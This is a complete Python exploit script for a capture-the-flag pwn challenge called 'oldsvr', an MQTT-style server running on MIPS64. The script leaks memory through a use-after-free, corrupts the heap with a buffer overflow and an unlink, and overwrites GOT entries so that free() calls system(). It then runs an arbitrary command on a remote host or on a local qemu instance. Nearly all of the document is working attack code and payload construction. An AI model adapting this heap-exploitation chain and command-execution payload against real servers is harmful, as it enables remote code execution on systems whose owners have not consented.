#!/usr/bin/env python3
# oldsvr (PWN11) exploit
#
# Remote:  python3 exp.py --host 47.105.126.181 --port 1883
# Local :  python3 exp.py --local
#
# Local mode needs qemu-mips64. If ./oldsvr is absent the attachment zip in
# 附件/ is unpacked automatically. The attachment ships no /bin/sh, so a minimal
# static sh is dropped into the qemu sysroot to make the final system() call work.

import argparse
import os
import shutil
import socket
import struct
import subprocess
import sys
import tempfile
import time
import zipfile

CLIENT_ID = b"QWB_Client"
USER = b"QWB2026_Admin"
PWD = b"1540124"
NEWS = b"QWB2026_News"
TOPIC_A = b"PWN2026_AAAAAA"
TOPIC_B = b"PWN2026_BBBBBB"

OFF_PIE_LEAK = 0x22000
OFF_FREE_GOT = 0x20220
OFF_MALLOC_GOT = 0x202B0
OFF_SLOT1_PAYLOAD_PTR = 0x20368
OFF_FAKE_RECORDS = 0x20350
OFF_WRITE_STUB = 0x6D40
OFF_MEMSET_RET = 0x30C0
OFF_MEMCMP_VARINT = 0x42F4
LIBC_MALLOC = 0x5DCA0
LIBC_SYSTEM = 0x65370

PAD_SUBS = 2000
OVERFLOW_LEN = 65520


def u16(b, o=0):
    return struct.unpack_from(">H", b, o)[0]


def u64(b, o=0):
    return struct.unpack_from(">Q", b, o)[0]


def p16(v):
    return struct.pack(">H", v & 0xFFFF)


def p64(v):
    return struct.pack(">Q", v & 0xFFFFFFFFFFFFFFFF)


def mqtt_len(n):
    out = bytearray()
    while True:
        b = n % 128
        n //= 128
        out.append(b | 0x80 if n else b)
        if not n:
            return bytes(out)


def str_field(data):
    return p16(len(data)) + data


def build_connect():
    body = (str_field(b"MQTT") + bytes([4, 0xC2]) + p16(0x4321)
            + str_field(CLIENT_ID) + str_field(USER) + str_field(PWD))
    return b"\x10" + mqtt_len(len(body)) + body


def build_sub(topic, pid):
    body = p16(pid) + str_field(topic) + b"\x00"
    return b"\x82" + mqtt_len(len(body)) + body


def build_unsub(topic, pid):
    body = p16(pid) + str_field(topic)
    return b"\xA2" + mqtt_len(len(body)) + body


def build_pub(topic, payload):
    body = str_field(topic) + payload
    return b"\x30" + mqtt_len(len(body)) + body


class IO:
    def __init__(self, sock):
        self.sock = sock
        self.sock.settimeout(3.0)

    def send(self, data):
        self.sock.sendall(data)

    def recv(self, n=4096, timeout=1.0):
        self.sock.settimeout(timeout)
        try:
            return self.sock.recv(n)
        except socket.timeout:
            return b""

    def recvn(self, n, timeout=3.0):
        buf = b""
        end = time.time() + timeout
        while len(buf) < n:
            left = end - time.time()
            if left <= 0:
                raise TimeoutError("need %d bytes, got %d" % (n, len(buf)))
            self.sock.settimeout(left)
            try:
                chunk = self.sock.recv(n - len(buf))
            except socket.timeout:
                raise TimeoutError("need %d bytes, got %d" % (n, len(buf)))
            if not chunk:
                raise EOFError("connection closed")
            buf += chunk
        return buf

    def close(self):
        try:
            self.sock.close()
        except OSError:
            pass


class Client:
    def __init__(self, io, verbose=True):
        self.io = io
        self.verbose = verbose
        self.msgid = 0

    def next_id(self):
        self.msgid = self.msgid % 0xFFFE + 1
        return self.msgid

    def log(self, msg):
        if self.verbose:
            print(msg, file=sys.stderr, flush=True)

    def recv_pkt(self, timeout=3.0):
        h = self.io.recvn(1, timeout)[0]
        mult, val = 1, 0
        for _ in range(4):
            b = self.io.recvn(1, timeout)[0]
            val += (b & 0x7F) * mult
            if not b & 0x80:
                break
            mult *= 128
        body = self.io.recvn(val, timeout) if val else b""
        return h, body

    def drain(self, timeout=0.6):
        while True:
            try:
                self.recv_pkt(timeout)
            except TimeoutError:
                return

    def connect(self):
        self.io.send(build_connect())
        h, body = self.recv_pkt()
        return h == 0x20 and body == b"\x00\x00"

    def sub(self, topic, wait=True):
        self.io.send(build_sub(topic, self.next_id()))
        if wait:
            h, _ = self.recv_pkt()
            return h == 0x90
        return True

    def unsub(self, topic, wait=True):
        self.io.send(build_unsub(topic, self.next_id()))
        if wait:
            h, _ = self.recv_pkt()
            return h == 0xB0
        return True

    def pub(self, topic, payload, expect=False):
        self.io.send(build_pub(topic, payload))
        if expect:
            return self.recv_pkt()
        return None

    def ping(self):
        self.io.send(b"\xC0\x00")
        h, _ = self.recv_pkt()
        return h == 0xD0


def overflow_payload(t):
    b = bytearray(OVERFLOW_LEN)
    b[0x06:0x0E] = p64(0x21)
    b[0x3E:0x46] = p64(t - 0x18)
    b[0x46:0x4E] = p64(t - 0x10)
    b[0xCE:0xD6] = p64(0xA0)
    b[0xD6:0xDE] = p64(0xB0)
    b[0x186:0x18E] = p64(0x21)
    b[0x1A6:0x1AE] = p64(0x21)
    return bytes(b)


def fake_records(records_addr, free_got, malloc_got, cmd):
    # copied to records_addr; slot1 (records+0x08) is the libc-leak slot,
    # slot2 (records+0x28) is the final system() slot.
    b = bytearray(80)
    b[0:len(cmd)] = cmd
    b[0x08:0x10] = p64(malloc_got)
    b[0x10:0x12] = p16(len(cmd))
    b[0x18:0x20] = p64(1)
    b[0x20:0x22] = p16(8)
    b[0x28:0x30] = p64(records_addr)
    b[0x30:0x32] = p16(len(cmd))
    b[0x38:0x40] = p64(free_got)
    b[0x40:0x42] = p16(80)
    return bytes(b)


def got_patch(pie):
    b = bytearray(80)
    b[0x00:0x08] = p64(pie + OFF_WRITE_STUB)
    b[0x28:0x30] = p64(pie + OFF_MEMSET_RET)
    b[0x48:0x50] = p64(pie + OFF_MEMCMP_VARINT)
    return bytes(b)


def leak_pie(cli):
    cli.log("[*] authenticating")
    if not cli.connect():
        raise RuntimeError("CONNECT rejected")

    cli.sub(NEWS)
    cli.sub(TOPIC_A)
    cli.sub(TOPIC_B)
    for _ in range(6):
        cli.ping()

    # short-message UAF: a freed payload is echoed back, first 8 bytes = heap ptr
    cli.pub(TOPIC_B, b"B" * 24)
    _, body = cli.pub(NEWS, b"A" * 24, expect=True)
    tlen = u16(body)
    raw = body[2 + tlen + 2:][:8]
    if len(raw) != 8:
        raise RuntimeError("bad NEWS reply")
    leak = u64(raw)
    pie = (leak - OFF_PIE_LEAK) & ~0xFFF
    cli.log("[*] heap leak %#x -> PIE %#x" % (leak, pie))
    return pie


def solve(cli, cmd, pads):
    cmd = cmd[:8].ljust(8, b" ")
    pie = leak_pie(cli)

    t_ptr = pie + OFF_SLOT1_PAYLOAD_PTR
    records_addr = pie + OFF_FAKE_RECORDS
    free_got = pie + OFF_FREE_GOT
    malloc_got = pie + OFF_MALLOC_GOT

    cli.log("[*] exhausting %d slots" % pads)
    for i in range(pads):
        cli.sub(b"pad_%04d" % i)

    # carve a 0x60 hole, then overflow the int16-truncated reply buffer
    cli.pub(TOPIC_A, b"A" * 73)
    cli.pub(TOPIC_A, b"A" * 160)
    cli.pub(TOPIC_B, b"B" * 160)
    time.sleep(0.2)
    cli.pub(NEWS, overflow_payload(t_ptr))
    time.sleep(0.2)
    # unlink: *(slot1.payload_ptr) = slot1.payload_ptr - 0x18 = fake records
    cli.unsub(TOPIC_B, wait=False)
    time.sleep(0.2)

    cli.log("[*] planting fake slot records")
    cli.pub(TOPIC_A, fake_records(records_addr, free_got, malloc_got, cmd))
    time.sleep(0.2)

    cli.log("[*] patching free/memset/memcmp GOT")
    cli.pub(cmd, got_patch(pie))
    time.sleep(0.2)

    # flush the leftovers (overflow reply + UNSUBACK) so the leak is byte-exact
    cli.drain(0.6)

    # slot1: free(malloc@GOT) then free(1) -> write(1, malloc@GOT, 8)
    cli.io.send(build_unsub(b"\x00" * 8, 0x4242))
    raw = cli.io.recvn(8, 3.0)
    malloc_libc = u64(raw)
    if malloc_libc < 0x100000000 or (malloc_libc - LIBC_MALLOC) & 0xFFF:
        raise RuntimeError("bad libc leak %#x" % malloc_libc)
    libc = malloc_libc - LIBC_MALLOC
    system = libc + LIBC_SYSTEM

    cli.log("[*] malloc@libc %#x -> libc %#x, system %#x" % (malloc_libc, libc, system))
    cli.drain(0.5)

    # slot2: memset is a no-op now, memcpy writes system over free@GOT
    cli.pub(b"\x00" * 8, p64(system))
    time.sleep(0.2)

    # slot2 again: free("cat flag") == system("cat flag")
    cli.log("[*] triggering system(%r)" % cmd.rstrip())
    cli.io.send(build_unsub(b"\x00" * 8, 0x4343))

    out = b""
    end = time.time() + 8
    while time.time() < end:
        try:
            chunk = cli.io.recv(4096, 1.0)
        except (TimeoutError, EOFError):
            break
        if not chunk:
            continue
        out += chunk
        if b"flag{" in out:
            break
    return out


def make_minish():
    zero, v0, a0, a1, a2, t0, s1, s2, s3, sp = 0, 2, 4, 5, 6, 8, 17, 18, 19, 29

    def itype(op, rs, rt, imm):
        return (op << 26) | (rs << 21) | (rt << 16) | (imm & 0xFFFF)

    def ld(rt, off, rs):
        return itype(0x37, rs, rt, off)

    def daddiu(rt, rs, imm):
        return itype(0x19, rs, rt, imm)

    def addiu(rt, rs, imm):
        return itype(0x09, rs, rt, imm)

    def move(rd, rs):
        return (rs << 21) | (rd << 11) | 0x2D

    def bltz(rs, off):
        return itype(0x01, rs, 0, off >> 2)

    def blez(rs, off):
        return itype(0x06, rs, 0, off >> 2)

    code = [
        ld(s1, 24, sp), daddiu(a0, s1, 4), move(a1, zero), move(a2, zero),
        addiu(v0, zero, 5002), 0x0C,
        move(s2, v0), bltz(s2, 0x44), 0,
        move(a0, s2), daddiu(t0, sp, -0x200), move(a1, t0), addiu(a2, zero, 0x100),
        addiu(v0, zero, 5000), 0x0C,
        move(s3, v0), blez(s3, 0x20), 0,
        addiu(a0, zero, 1), move(a1, t0), move(a2, s3),
        addiu(v0, zero, 5001), 0x0C,
        move(a0, zero), addiu(v0, zero, 5205), 0x0C,
        addiu(a0, zero, 1), addiu(v0, zero, 5205), 0x0C,
    ]
    entry, text_off, base = 0x400100, 0x100, 0x400000
    body = struct.pack(">HHI", 2, 8, 1)
    body += struct.pack(">QQQ", entry, 64, 0)
    body += struct.pack(">I", 0x60000000)
    body += struct.pack(">HHHHHH", 64, 56, 1, 0, 0, 0)
    ehdr = b"\x7fELF" + bytes([2, 2, 1, 0]) + b"\x00" * 8 + body
    blob = b"".join(struct.pack(">I", w) for w in code)
    filesz = text_off + len(blob)
    phdr = struct.pack(">IIQQQQQQ", 1, 7, 0, base, base, filesz, filesz, 0x1000)
    return ehdr + phdr + b"\x00" * (text_off - len(ehdr) - len(phdr)) + blob


def find_attachment_zip():
    here = os.path.dirname(os.path.abspath(__file__))
    for base in (os.getcwd(), here):
        att = os.path.join(base, "附件")
        if not os.path.isdir(att):
            continue
        for name in sorted(os.listdir(att)):
            if name.endswith(".zip") and "oldsvr" in name:
                return os.path.join(att, name)
    return None


def start_local(server_dir, flag_dir):
    root = tempfile.mkdtemp(prefix="oldsvr-root-")
    if not os.path.exists(os.path.join(server_dir, "server")):
        zip_path = find_attachment_zip()
        if zip_path is None:
            raise RuntimeError("server not found: %s" % server_dir)
        pkg = os.path.join(root, "pkg")
        with zipfile.ZipFile(zip_path) as zf:
            zf.extractall(pkg)
        server_dir = os.path.join(pkg, "oldsvr")
        os.chmod(os.path.join(server_dir, "server"), 0o755)
    server = os.path.abspath(os.path.join(server_dir, "server"))
    libdir = os.path.join(server_dir, "lib")
    if not os.path.exists(server):
        raise RuntimeError("server not found: %s" % server)
    os.chmod(server, 0o755)
    os.makedirs(os.path.join(root, "bin"))
    os.makedirs(os.path.join(root, "lib"))
    for name in os.listdir(libdir):
        shutil.copy2(os.path.join(libdir, name), os.path.join(root, "lib", name))
    # the attachment keeps versioned names; the loader asks for the bare sonames
    sonames = {
        "ld64-uClibc.so.0": "ld64-uClibc-1.0.32.so",
        "libc.so.0": "libuClibc-1.0.32.so",
        "libuClibc.so.0": "libuClibc-1.0.32.so",
    }
    for link, target in sonames.items():
        path = os.path.join(root, "lib", link)
        if not os.path.exists(path):
            os.symlink(target, path)
    sh = os.path.join(root, "bin", "sh")
    with open(sh, "wb") as fh:
        fh.write(make_minish())
    os.chmod(sh, 0o755)

    parent, child = socket.socketpair()
    proc = subprocess.Popen(
        ["qemu-mips64", "-L", root, server],
        cwd=os.path.abspath(flag_dir),
        stdin=child.fileno(), stdout=child.fileno(), stderr=subprocess.DEVNULL,
        close_fds=True,
    )
    child.close()
    return IO(parent), proc, root


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host")
    ap.add_argument("--port", type=int)
    ap.add_argument("--local", action="store_true")
    ap.add_argument("--server-dir", default="oldsvr")
    ap.add_argument("--flag-dir", default=None)
    ap.add_argument("--pads", type=int, default=PAD_SUBS)
    ap.add_argument("--cmd", default="cat /f*")
    ap.add_argument("-q", "--quiet", action="store_true")
    args = ap.parse_args()

    proc = None
    root = None
    tmp_flag = None
    try:
        if args.local:
            flag_dir = args.flag_dir
            if flag_dir is None:
                tmp_flag = tempfile.mkdtemp(prefix="oldsvr-flag-")
                with open(os.path.join(tmp_flag, "flag"), "w") as fh:
                    fh.write("flag{oldsvr_local_demo}\n")
                flag_dir = tmp_flag
            io, proc, root = start_local(args.server_dir, flag_dir)
            cmd = args.cmd
            if cmd == "cat /f*":
                cmd = "cat flag"
        elif args.host:
            if not args.port:
                ap.error("--port required with --host")
            io = IO(socket.create_connection((args.host, args.port), timeout=10))
            cmd = args.cmd
        else:
            ap.error("choose --local or --host")
            return 2

        cli = Client(io, verbose=not args.quiet)
        out = solve(cli, cmd.encode(), args.pads)
        io.close()

        idx = out.find(b"flag{")
        if idx >= 0:
            end = out.find(b"}", idx)
            flag = out[idx:end + 1] if end >= 0 else out[idx:]
            print("[+] FLAG = %s" % flag.decode("latin-1"))
            return 0
        print("[-] no flag in output: %r" % out[-400:])
        return 1
    finally:
        if proc is not None:
            proc.kill()
            proc.wait()
        if root:
            shutil.rmtree(root, ignore_errors=True)
        if tmp_flag:
            shutil.rmtree(tmp_flag, ignore_errors=True)


if __name__ == "__main__":
    sys.exit(main())
